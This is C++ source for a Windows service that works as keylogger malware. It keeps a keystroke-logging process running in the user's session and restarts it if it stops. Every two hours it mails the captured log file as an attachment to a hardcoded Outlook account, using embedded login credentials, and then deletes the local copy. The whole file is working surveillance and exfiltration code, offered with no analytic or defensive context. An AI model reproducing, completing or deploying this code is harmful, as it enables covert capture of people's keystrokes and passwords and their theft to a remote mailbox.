#pragma once

#include "stdafx.h"
#include "CSmtp.h"
#include "KeyLogManager.h"
#include "ServiceManager.h"
#include "tlhelp32.h"
#include "Logger.h"
#include  <io.h>
#include  <stdio.h>
#include  <stdlib.h>

char* SERVICE_NAME = "Sundar_Service";

class Service
{
public:
	static HANDLE keylog_tid;
	static HANDLE email_tid;
	static bool running;

	static SERVICE_STATUS_HANDLE   hServiceStatusHandle; 
	static SERVICE_STATUS          ServiceStatus; 

	static PROCESS_INFORMATION	keylog_proc_info;

	static SERVICE_TABLE_ENTRY lpServiceStartTable[];

	static int start_service(){
		return StartServiceCtrlDispatcher(lpServiceStartTable);
	}

	static VOID WINAPI service_proc(DWORD dwArgc, LPTSTR *lpszArgv)
	{
		DWORD   status = 0; 
		DWORD   specificError = 0xfffffff; 

		ServiceStatus.dwServiceType        = SERVICE_WIN32; 
		ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
		ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN | SERVICE_ACCEPT_PAUSE_CONTINUE; 
		ServiceStatus.dwWin32ExitCode      = 0; 
		ServiceStatus.dwServiceSpecificExitCode = 0; 
		ServiceStatus.dwCheckPoint         = 0; 
		ServiceStatus.dwWaitHint           = 0; 

		hServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, service_handler); 
		if (hServiceStatusHandle==0) {
			Logger::debug("RegisterServiceCtrlHandler failed, error code = %d\n", GetLastError());
			return; 
		} 

		// Initialization complete - report running status 
		ServiceStatus.dwCurrentState       = SERVICE_RUNNING; 
		ServiceStatus.dwCheckPoint         = 0; 
		ServiceStatus.dwWaitHint           = 0;  
		if(!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
			Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError()); 
		} 

		start_service_busi();
	}


	static bool start_keylog_proc(){
		char exe_path[MAX_PATH];
		DWORD size = GetModuleFileName(NULL, exe_path, sizeof(exe_path));
		exe_path[size] = 0;
		char cmd[512] = {0};
		sprintf(cmd, "%s -k", exe_path);
		bool ret = ServiceManager::create_process_as_user(cmd, &keylog_proc_info);
		if(ret) {
			Sleep(1000);
			Logger::debug("Start Keylog Proc Succ");
			return true;
		}else {
			Logger::debug("Start Keylog Proc Fail, error code = %d\n", GetLastError()); 
			return false;
		}
	}

	static bool stop_keylog_proc(){
		if(keylog_proc_info.hProcess){
			PostThreadMessage(keylog_proc_info.dwThreadId, WM_QUIT, 0, 0);
			Sleep(1000);
			BOOL ret = TerminateProcess(keylog_proc_info.hProcess, 0);
			Logger::debug("Try To Stop Keylog Proc, %d", ret);
		}
		keylog_proc_info.hProcess = 0;
		return true;
	}

	static DWORD WINAPI keylog_thread(LPVOID info){
		while(running){
			Sleep(5000);
			if(!keylog_proc_info.hProcess){
				if(start_keylog_proc()){
					Logger::debug("Start Keylog Proc From Service Succ");
				}else{
					Logger::debug("Start Keylog Proc From Service Fail");
				}
			} else {
				DWORD code;
				GetExitCodeProcess(keylog_proc_info.hProcess, &code);
				if(code == STILL_ACTIVE){
					Logger::debug("Check Keylog Proc Succ");
					continue;
				}
				keylog_proc_info.hProcess = 0;
				if(start_keylog_proc()){
					Logger::debug("Start Keylog Proc From Service Succ");
				}else{
					Logger::debug("Start Keylog Proc From Service Fail");
				}
			}	
		}
		Logger::debug("Keylog Thread Finish");
		stop_keylog_proc();
		return 0;
	}

	static DWORD WINAPI email_thread(LPVOID info){
		time_t last_send = {0};
		while(running){
			time_t now = time(NULL);
			double diff = difftime(now, last_send);
			Logger::debug("Email Thread Running, Timediff %f", diff);
			if(diff > 7200){
				bool ret = send_mail();
				if(ret){
					last_send = now;
					Logger::debug("Email Sending Succ ............... ");
				}else{
					Logger::debug("Email Send Fail ............. ");
				}
			}
			Sleep(5000);
		}
		Logger::debug("Email Thread Finish");
		return 0;
	}

	static bool send_mail(){
		char path[512];
		Tool::get_save_path(path);
		try{
			CSmtp mail;
			mail.SetSMTPServer("smtp-mail.outlook.com", 587);
			mail.SetSecurityType(SMTP_SECURITY_TYPE::USE_TLS);

			//mail.SetLogin("cchtriptest@outlook.com");
			//mail.SetPassword("cchtrip123");
			//mail.SetSenderName("cchtriptest");
			//mail.SetSenderMail("cchtriptest@outlook.com");
			//mail.SetReplyTo("cchtriptest@outlook.com");
			//mail.AddRecipient("cchtriptest@outlook.com");
			
			mail.SetLogin("temptemptest@outlook.com");
			mail.SetPassword("temptest!!!");
			mail.SetSenderName("temptemptest");
			mail.SetSenderMail("temptemptest@outlook.com");
			mail.SetReplyTo("temptemptest@outlook.com");
			mail.AddRecipient("temptemptest@outlook.com");

			mail.SetSubject("Upload");
			mail.SetXPriority(CSmptXPriority::XPRIORITY_NORMAL);
			//mail.SetXMailer("The Bat! (v3.02) Professional");
			mail.AddMsgLine("DOTO....");
			int ret = access(path, 0);
			if(-1 != access(path, 0)){
				mail.AddAttachment(path);
			}
			mail.Send();
		}catch(ECSmtp e){
			Logger::debug("Send Mail Fail, Error:%s", e.GetErrorText().c_str());
			return false;
		}
		DeleteFile(path);
		return true;
	}

	static void start_service_busi(){
		Logger::debug("Start Service Busi");
		if(running){
			return;
		}
		running = true;
		keylog_tid = CreateThread(NULL, 0, keylog_thread, NULL, 0, NULL);
		email_tid = CreateThread(NULL, 0, email_thread, NULL, 0, NULL);
		if(!keylog_tid || !email_tid){
			Logger::debug("Create Working Thread Fail");
		} else{
			Logger::debug("Create Working Thread Succ");
		}
	}
	static void stop_service_busi(){
		Logger::debug("Stop Service Busi");
		running = false;
	}

	static VOID WINAPI service_handler(DWORD fdwControl)
	{
		switch(fdwControl) 
		{
			case SERVICE_CONTROL_STOP:
			case SERVICE_CONTROL_SHUTDOWN:
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
			ServiceStatus.dwCheckPoint    = 0; 
			ServiceStatus.dwWaitHint      = 0;
		// terminate all processes started by this service before shutdown
			{
				stop_service_busi();		
			}
			break; 
			case SERVICE_CONTROL_PAUSE:
			ServiceStatus.dwCurrentState = SERVICE_PAUSED; 
			break;
			case SERVICE_CONTROL_CONTINUE:
			ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
			break;
			case SERVICE_CONTROL_INTERROGATE:
			break;
			default:
			Logger::debug("Unrecognized opcode %d\n", fdwControl);
		};
		if (!SetServiceStatus(hServiceStatusHandle, &ServiceStatus)) {
			Logger::debug("SetServiceStatus failed, error code = %d\n", GetLastError());
		} 
	}
};

SERVICE_TABLE_ENTRY Service::lpServiceStartTable[] = 
{
	{SERVICE_NAME, Service::service_proc},
	{NULL, NULL}
};
PROCESS_INFORMATION	Service::keylog_proc_info = {0};

HANDLE Service::keylog_tid = 0;
HANDLE Service::email_tid = 0;
bool Service::running = false;

SERVICE_STATUS_HANDLE   Service::hServiceStatusHandle = 0; 
SERVICE_STATUS          Service::ServiceStatus = {0}; 